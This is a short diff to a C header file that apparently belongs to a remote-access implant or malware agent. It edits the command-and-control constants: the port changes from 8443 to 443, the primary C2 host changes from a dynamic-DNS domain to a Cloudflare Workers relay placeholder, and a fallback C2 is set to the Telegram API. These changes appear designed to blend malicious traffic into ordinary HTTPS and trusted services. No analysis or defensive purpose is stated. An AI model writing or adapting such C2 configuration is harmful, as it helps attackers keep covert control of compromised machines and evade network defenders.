@@ -20,9 +20,9 @@ extern volatile bool ph_agent_is_busy;
 #define PH_MAC_SIZE 16
 #define PH_FINGERPRINT_SIZE 16
 
-#define DEFAULT_C2_PORT 8443
-#define DEFAULT_C2_HOST "oyen-sc.serveblog.net"
-#define FALLBACK_C2_HOST "oyen-sc.serveblog.net"
+#define DEFAULT_C2_PORT 443
+#define DEFAULT_C2_HOST "ghost-relay.your-subdomain.workers.dev"
+#define FALLBACK_C2_HOST "api.telegram.org"
 
 #define PH_OK 0
 #define PH_ERR_NULL_PTR -1
